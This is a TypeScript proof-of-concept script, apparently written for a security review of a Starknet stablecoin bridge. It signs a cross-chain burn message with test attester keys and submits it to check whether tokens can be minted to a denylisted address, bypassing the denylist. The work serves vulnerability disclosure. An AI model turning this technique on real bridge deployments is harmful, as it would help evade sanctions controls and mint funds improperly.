import { ethers } from "ethers";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";
import {
  loadStablecoin,
  loadTokenMessengerMinter,
  loadMessageTransmitter,
  constructBurnMessage,
  constructMessage,
  provider,
} from "../../e2e/utils.js";
import { CairoByteArray, CallData, num } from "starknet";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ARTIFACTS_DIR = path.join(__dirname, "artifacts");

const REMOTE_DOMAIN = 2;
const DESTINATION_DOMAIN = 25;
const REMOTE_BURN_TOKEN = "0x1111111111111111111111111111111111111111111111111111111111111111";
const REMOTE_SENDER = "0x2000";

const denylistedRecipient = padAddress("0xdeadbeef");
const denylistedRecipientFelt = num.toBigInt(denylistedRecipient);

function padAddress(address: string): string {
  const hex = address.replace(/^0x/, "");
  return `0x${hex.padStart(64, "0")}`;
}

function generateAttestation(message: Uint8Array, attesters: { privateKey: string; address: string }[]) {
  const messageHash = ethers.keccak256(message);
  const signatures = attesters.map((attester) => {
    const wallet = new ethers.Wallet(attester.privateKey);
    const signature = wallet.signingKey.sign(messageHash);
    const r = signature.r.substring(2).padStart(64, "0");
    const s = signature.s.substring(2).padStart(64, "0");
    const v = signature.v.toString(16).padStart(2, "0");
    return { address: attester.address, signature: `${r}${s}${v}` };
  });

  signatures.sort((a, b) => {
    const addrA = BigInt(a.address);
    const addrB = BigInt(b.address);
    if (addrA < addrB) return -1;
    if (addrA > addrB) return 1;
    return 0;
  });

  const attestationHex = `0x${signatures.map((s) => s.signature).join("")}`;
  return new CairoByteArray(attestationHex);
}

function serializeBigInts(value: unknown): unknown {
  if (typeof value === "bigint") {
    return value.toString();
  }
  if (Array.isArray(value)) {
    return value.map(serializeBigInts);
  }
  if (value && typeof value === "object") {
    const result: Record<string, unknown> = {};
    for (const [key, entry] of Object.entries(value as Record<string, unknown>)) {
      result[key] = serializeBigInts(entry);
    }
    return result;
  }
  return value;
}

async function invokeWithManualTip(account: any, contract: any, entrypoint: string, args: unknown[]) {
  const populated = await contract.populate(entrypoint, args);
  await account.execute(
    [
      {
        contractAddress: contract.address,
        entrypoint,
        calldata: populated.calldata,
      },
    ],
    { tip: "0x0" },
  );
}

async function linkTokenPair(tokenMessengerMinter: Awaited<ReturnType<typeof loadTokenMessengerMinter>>, stablecoinAddress: string) {
  const existing = await tokenMessengerMinter.contract.get_local_token(REMOTE_DOMAIN, REMOTE_BURN_TOKEN);
  if (BigInt(existing) !== 0n) {
    return;
  }
  await invokeWithManualTip(
    tokenMessengerMinter.token_controller,
    tokenMessengerMinter.contract,
    "link_token_pair",
    [stablecoinAddress, REMOTE_DOMAIN, REMOTE_BURN_TOKEN],
  );
}

async function ensureRecipientDenylisted(tokenMessengerMinter: Awaited<ReturnType<typeof loadTokenMessengerMinter>>) {
  const alreadyDenylisted = await tokenMessengerMinter.contract.is_denylisted(denylistedRecipient);
  if (!alreadyDenylisted) {
    await invokeWithManualTip(
      tokenMessengerMinter.denylister,
      tokenMessengerMinter.contract,
      "denylist",
      [denylistedRecipient],
    );
  }
  const isDenylisted = await tokenMessengerMinter.contract.is_denylisted(denylistedRecipient);
  console.log("Recipient `%s` has been denylisted", denylistedRecipient);
  return isDenylisted;
}

async function main() {
  const [stablecoin, tokenMessengerMinter, messageTransmitter] = await Promise.all([
    loadStablecoin(),
    loadTokenMessengerMinter(),
    loadMessageTransmitter(),
  ]);

  await linkTokenPair(tokenMessengerMinter, stablecoin.contract.address);
  await ensureRecipientDenylisted(tokenMessengerMinter);

  const initialBalance = await stablecoin.contract.balance_of(denylistedRecipient);
  console.log("Initial denylisted balance:", initialBalance.toString());

  const burnMessageBytes = constructBurnMessage({
    version: 1,
    burnToken: REMOTE_BURN_TOKEN,
    mintRecipient: denylistedRecipient,
    amount: 1_000n,
    messageSender: tokenMessengerMinter.tester.address,
    maxFee: 0n,
    hookData: "",
  });
  const burnMessageByteArray = new CairoByteArray(burnMessageBytes);

  const messageBytes = constructMessage({
    version: 1,
    sourceDomain: REMOTE_DOMAIN,
    destinationDomain: DESTINATION_DOMAIN,
    nonce: BigInt(Date.now()),
    sender: REMOTE_SENDER,
    recipient: tokenMessengerMinter.contract.address,
    destinationCaller: "0x0",
    minFinalityThreshold: 500,
    finalityThresholdExecuted: 2000,
    burnMessage: {
      version: 1,
      burnToken: REMOTE_BURN_TOKEN,
      mintRecipient: denylistedRecipient,
      amount: 1_000n,
      messageSender: tokenMessengerMinter.tester.address,
      maxFee: 0n,
      hookData: "",
    },
  });
  const messageByteArray = new CairoByteArray(messageBytes);

  const attestation = generateAttestation(messageBytes, messageTransmitter.attesters);

  messageTransmitter.contract.providerOrAccount = messageTransmitter.tester;
  const receiveTx = await messageTransmitter.contract.receive_message(
    CallData.compile([...messageByteArray.toApiRequest(), ...attestation.toApiRequest()]),
  );
  const receiveReceipt = await provider.waitForTransaction(receiveTx.transaction_hash);
  console.log("Message processed in tx:", receiveTx.transaction_hash);

  const tmmEvents = tokenMessengerMinter.contract.parseEvents(receiveReceipt);
  const mintEvent = tmmEvents.find((event) =>
    Object.keys(event).some((key) => key.includes("MintAndWithdraw")),
  );

  if (mintEvent) {
    console.log("MintAndWithdraw event emitted:", JSON.stringify(serializeBigInts(mintEvent), null, 2));
  } else {
    console.warn("No MintAndWithdraw event found in receipt");
  }

  const finalBalance = await stablecoin.contract.balance_of(denylistedRecipient);
  const delta = finalBalance - initialBalance;
  console.log("Final denylisted balance:", finalBalance.toString());
  console.log("Tokens minted to denylisted address:", delta.toString());

  await fs.mkdir(ARTIFACTS_DIR, { recursive: true });
  const runDir = path.join(ARTIFACTS_DIR, new Date().toISOString().replace(/[:.]/g, "-"));
  await fs.mkdir(runDir, { recursive: true });

  const burnMessageHex = burnMessageByteArray.toHexString();
  const messageHex = messageByteArray.toHexString();
  const attestationHex = attestation.toHexString();

  const artifact = serializeBigInts({
    timestamp: new Date().toISOString(),
    denylistedRecipient: {
      hex: denylistedRecipient,
      decimal: denylistedRecipientFelt.toString(),
    },
    contracts: {
      stablecoin: stablecoin.contract.address,
      tokenMessengerMinter: tokenMessengerMinter.contract.address,
      messageTransmitter: messageTransmitter.contract.address,
    },
    tx: {
      hash: receiveTx.transaction_hash,
      block_hash: receiveReceipt.block_hash,
      block_number: receiveReceipt.block_number,
      status: receiveReceipt.status,
    },
    message: {
      burnMessageHex,
      messageHex,
      attestationHex,
    },
    balances: {
      initial: initialBalance.toString(),
      final: finalBalance.toString(),
      delta: delta.toString(),
    },
    mintEvent,
    receipt: receiveReceipt,
  });

  const artifactPath = path.join(runDir, "summary.json");
  await fs.writeFile(artifactPath, JSON.stringify(artifact, null, 2));
  console.log(`Artifacts saved to ${artifactPath}`);
}

main().catch((error) => {
  console.error("PoC failed", error);
  process.exit(1);
});
